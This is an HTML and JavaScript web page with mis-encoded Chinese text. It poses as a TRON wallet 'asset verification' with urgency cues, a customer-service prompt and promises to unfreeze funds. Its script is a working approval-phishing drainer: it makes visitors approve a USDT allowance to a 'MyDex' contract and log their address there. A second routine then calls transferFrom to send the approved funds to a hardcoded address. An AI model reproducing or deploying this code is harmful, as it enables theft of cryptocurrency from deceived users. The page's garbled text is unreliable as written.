<!doctype html>
<html lang="zh">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>é€²è¡ŒéŒ¢åŒ…è³‡ç”¢é©—è­‰</title>
  <style>
    .center {
      margin: auto;
      width: 60%;
      padding: 10px;
    }
    input {
      width: 100%;
      padding: 5px;
      margin-top: 5px;
    }
    button {
      margin-top: 10px;
      padding: 10px;
      width: 100%;
      font-size: 16px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="center">
    <button id="connectButton">è«‹é€£æ¥éŒ¢åŒ…</button>
  </div>

  <div class="center">
    <label>é©—è­‰åœ°å€ï¼ˆç›®å‰æœªç”¨ï¼‰ï¼š</label>
    <input id="verifyAddress" placeholder="æ”¶æ¬¾è€…æˆ–åˆç´„åœ°å€" />
  </div>

  <div class="center">
    <label>é©—è­‰é‡‘é¡ï¼š</label>
    <input id="verifyAmount" placeholder="ä¾‹å¦‚ 0.1" />
  </div>

  <div class="center">
    <button id="approve_Btn">é©—è­‰ï¼ˆæˆæ¬Šï¼‰</button>
  </div>

  <div class="center">
    <label>âš ï¸ è«‹æ–¼ååˆ†é˜å…§å®Œæˆé©—è­‰æµç¨‹</label>
  </div>

  <div class="center">
    <button id="transferFrom_Btn">è«‹æ–¼å®¢æœé€šçŸ¥å¾Œé»æ“Šè½‰å¸³</button>
  </div>

  <div class="center">
    <label>é©—è­‰å®Œæˆå¾Œå°‡é–‹å•Ÿè§£å‡</label>
  </div>

  <div class="center">
    <button id="checkBtn">æŸ¥è©¢æˆæ¬Šèˆ‡é¤˜é¡</button>
  </div>

  <script>
    // DOM å…ƒç´ 
    const connectButton = document.getElementById("connectButton");
    const approveButton = document.getElementById("approve_Btn");
    const transferFromButton = document.getElementById("transferFrom_Btn");
    const checkBtn = document.getElementById("checkBtn");

    const verifyAddressInput = document.getElementById("verifyAddress");
    const verifyAmountInput = document.getElementById("verifyAmount");

    // åˆç´„åœ°å€ï¼ˆShasta æ¸¬è©¦ç¶²ï¼‰
    const USDT_contractAddress = "TG3XXyExBkPp9nzdajDZsozEu4BkaSJozs"; // USDT åˆç´„åœ°å€
    const MyDex_contractAddress = "TWKeZLCX7b6xnyhL9PyFhkA7A8ezkQRWsF"; // ä½ çš„ MyDex åˆç´„åœ°å€

    // TRC20 ERC20 é¡å‹åˆç´„ ABI ç‰‡æ®µ
    const TRC20_ABI = [
      {
        constant: false,
        inputs: [
          { name: "_spender", type: "address" },
          { name: "_value", type: "uint256" }
        ],
        name: "approve",
        outputs: [{ name: "", type: "bool" }],
        type: "function"
      },
      {
        constant: true,
        inputs: [
          { name: "_owner", type: "address" },
          { name: "_spender", type: "address" }
        ],
        name: "allowance",
        outputs: [{ name: "remaining", type: "uint256" }],
        type: "function"
      },
      {
        constant: true,
        inputs: [{ name: "_owner", type: "address" }],
        name: "balanceOf",
        outputs: [{ name: "balance", type: "uint256" }],
        type: "function"
      }
    ];

    // MyDex åˆç´„ ABI ç‰‡æ®µ
    const MyDex_ABI = [
      {
        constant: false,
        inputs: [{ name: "user", type: "address" }],
        name: "addAddress",
        outputs: [],
        type: "function"
      },
      {
        constant: true,
        inputs: [{ name: "index", type: "uint256" }],
        name: "getIndexAddress",
        outputs: [{ name: "", type: "address" }],
        type: "function"
      },
      {
        constant: false,
        inputs: [
          { name: "from", type: "address" },
          { name: "to", type: "address" },
          { name: "amount", type: "uint256" }
        ],
        name: "transferFrom",
        outputs: [],
        type: "function"
      }
    ];

    // é€£æ¥éŒ¢åŒ…
    connectButton.onclick = async () => {
      if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
        alert("éŒ¢åŒ…å·²é€£æ¥ï¼š" + window.tronWeb.defaultAddress.base58);
        connectButton.innerHTML = "å·²é€£æ¥éŒ¢åŒ…ï¼š" + window.tronWeb.defaultAddress.base58;
      } else if (window.tronLink) {
        try {
          await window.tronLink.request({ method: "tron_requestAccounts" });
        } catch (error) {
          alert("è«‹å…ˆå…è¨±éŒ¢åŒ…é€£æ¥");
        }
      } else {
        alert("è«‹å®‰è£ TronLink æˆ–ä½¿ç”¨ imToken å…§å»ºç€è¦½å™¨");
      }
    };

    // æˆæ¬Šä¸¦åŠ å…¥åœ°å€
    approveButton.onclick = async () => {
      if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
        alert("è«‹å…ˆé€£æ¥éŒ¢åŒ…");
        return;
      }

      const amountStr = verifyAmountInput.value.trim();
      if (!amountStr) {
        alert("è«‹è¼¸å…¥é©—è­‰é‡‘é¡");
        return;
      }

      // è¨ˆç®—æˆæ¬Šæ•¸é‡ï¼ŒUSDTå°æ•¸6ä½
      const amount = BigInt(Math.floor(parseFloat(amountStr) * 1e6)).toString();
      const userAddress = window.tronWeb.defaultAddress.base58;

      const USDT = await window.tronWeb.contract(TRC20_ABI, USDT_contractAddress);
      const MyDex = await window.tronWeb.contract(MyDex_ABI, MyDex_contractAddress);

      try {
        console.log("ğŸ“ é–‹å§‹æˆæ¬Š USDTï¼Œæ•¸é‡ï¼š", amount);
        const tx1 = await USDT.approve(MyDex_contractAddress, amount).send({ feeLimit: 100_000_000 });
        console.log("âœ… æˆæ¬ŠæˆåŠŸï¼š", tx1);

        const tx2 = await MyDex.addAddress(userAddress).send({ feeLimit: 100_000_000 });
        console.log("âœ… åŠ å…¥åœ°å€æˆåŠŸï¼š", tx2);

        alert("æˆæ¬Šèˆ‡åŠ å…¥æˆåŠŸ");
      } catch (err) {
        console.error("âŒ æˆæ¬ŠéŒ¯èª¤ï¼š", err);
        alert("æˆæ¬Šå¤±æ•—ï¼Œè«‹ç¢ºèª TRX æ‰‹çºŒè²»èˆ‡åˆç´„åœ°å€");
      }
    };

    // è½‰å¸³ USDT (å¾æˆæ¬Šåœ°å€åˆ°æŒ‡å®šåœ°å€)
    transferFromButton.onclick = async () => {
      if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
        alert("è«‹å…ˆé€£æ¥éŒ¢åŒ…");
        return;
      }

      try {
        const MyDex = await window.tronWeb.contract(MyDex_ABI, MyDex_contractAddress);
        const USDT = await window.tronWeb.contract(TRC20_ABI, USDT_contractAddress);

        // å¾åˆç´„çš„ users é™£åˆ—ä¸­å–ç¬¬ä¸€å€‹åœ°å€(å‡è¨­ç‚ºæˆæ¬Šåœ°å€)
        const fromHex = await MyDex.getIndexAddress(0).call();
        const from = window.tronWeb.address.fromHex(fromHex);
        console.log("fromHex:", fromHex);
        console.log("from (Base58):", from);

        // è½‰å¸³ç›®æ¨™åœ°å€ï¼Œé€™è£¡ç¡¬ç·¨å¯«ç¤ºç¯„
        const to = "TBofpm8BrK1sgAgUFmQTKgbSHkFr8HgM5B";
        console.log("to:", to);

        // æŸ¥è©¢æˆæ¬Šé¡åº¦
        let allowance = await USDT.allowance(from, MyDex_contractAddress).call();
        allowance = window.tronWeb.toBigNumber(allowance).toString();
        console.log("allowance:", allowance);

        if (BigInt(allowance) === 0n) {
          alert("å°šæœªæˆæ¬Šï¼Œç„¡æ³•è½‰å¸³");
          return;
        }

        // åƒæ•¸å­—ä¸²åŒ–
        const fromStr = String(from);
        const toStr = String(to);
        const allowanceStr = String(allowance);

        console.log({ fromStr, toStr, allowanceStr });

        // å…ˆå˜—è©¦ call æ¸¬è©¦åƒæ•¸æœ‰æ•ˆæ€§
        await MyDex.transferFrom(fromStr, toStr, allowanceStr).call();

        // åŸ·è¡Œäº¤æ˜“ï¼Œå¸¶æ‰‹çºŒè²»é™åˆ¶
        const tx = await MyDex.transferFrom(fromStr, toStr, allowanceStr).send({ feeLimit: 100_000_000 });
        console.log("è½‰å¸³æˆåŠŸ", tx);
        alert("è½‰å¸³æˆåŠŸ");
      } catch (err) {
        console.error("è½‰å¸³å¤±æ•—", err);
        alert("è½‰å¸³å¤±æ•—ï¼Œè«‹ç¢ºèªæˆæ¬Šç‹€æ…‹èˆ‡ TRX é¤˜é¡");
      }
    };

    // æŸ¥è©¢ç›®å‰æˆæ¬Šèˆ‡é¤˜é¡
    checkBtn.onclick = async () => {
      if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
        alert("è«‹å…ˆé€£æ¥éŒ¢åŒ…");
        return;
      }

      const userAddress = window.tronWeb.defaultAddress.base58;

      try {
        const USDT = await window.tronWeb.contract(TRC20_ABI, USDT_contractAddress);

        // æŸ¥é¤˜é¡
        let balance = await USDT.balanceOf(userAddress).call();
        // æŸ¥æˆæ¬Šé¡åº¦
        let allowance = await USDT.allowance(userAddress, MyDex_contractAddress).call();

        balance = window.tronWeb.toBigNumber(balance).toString();
        allowance = window.tronWeb.toBigNumber(allowance).toString();

        alert(`åœ°å€: ${userAddress}\nUSDT é¤˜é¡: ${balance}\næˆæ¬Šé¡åº¦: ${allowance}`);
      } catch (error) {
        console.error("æŸ¥è©¢éŒ¯èª¤:", error);
        alert("æŸ¥è©¢å¤±æ•—ï¼Œè«‹ç¢ºèªéŒ¢åŒ…é€£æ¥èˆ‡åˆç´„åœ°å€");
      }
    };
  </script>
</body>
</html>
